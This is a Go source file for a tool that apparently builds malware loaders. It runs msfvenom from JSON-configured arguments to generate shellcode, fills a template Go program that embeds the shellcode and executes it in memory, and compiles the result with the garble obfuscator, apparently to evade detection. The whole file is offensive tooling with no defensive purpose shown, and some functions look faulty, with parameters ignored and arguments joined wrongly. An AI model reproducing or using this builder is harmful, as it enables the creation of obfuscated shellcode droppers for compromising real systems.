package goloads

import (
	"bytes"
	"fmt"
	λ "github.com/4thel00z/lambda/v1"
	"io/ioutil"
	"os"
	"os/exec"
	"strings"
)

type Env map[string]string

func (e Env) ToList() []string {
	l := []string{}
	for k, v := range e {
		l = append(l, fmt.Sprintf("%s=%s", k, v))
	}
	return l
}

type Payload struct {
	Args map[string]string `json:"args"`
	Env  Env               `json:"env"`
}

var (
	payloadTemplate = `package main

import (
	_ "embed"

	shellcode "github.com/brimstone/go-shellcode"
)

//go:embed $PLACEHOLDER$
var b []byte

func main() {
	shellcode.Run(b)
}
`
)

func Load(path string) (Payload, error) {
	var p Payload
	err := λ.Open(path).Slurp().JSON(&p).Error()
	return p, err
}

func GetGoCode(dir, pattern, path string) (*os.File, error) {
	t, err := ioutil.TempFile("goloads", "*")
	if err != nil {
		return nil, err
	}
	_, err = t.Write([]byte(strings.Replace(payloadTemplate, "$PLACEHOLDER$", path, 1)))
	if err != nil {
		return nil, err
	}

	return t, nil
}
func (p Payload) GetMsfVenomArgs() []string {
	args := []string{}
	for k, v := range p.Args {
		args = append(args, fmt.Sprintf("%s %s", k, v))
	}
	return args
}

func (p Payload) Venom() (string, error) {
	// msfvenom has to be in the path
	cmd := exec.Command("msfvenom", p.GetMsfVenomArgs()...)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Env = append(os.Environ(), p.Env.ToList()...)
	err := cmd.Run()
	return out.String(), err
}

func Garble(pwd, output string, args ...string) error {
	defaults := []string{"-o", output}
	cmd := exec.Command("garble", append(defaults, args...)...)
	cmd.Dir = pwd
	return cmd.Run()
}
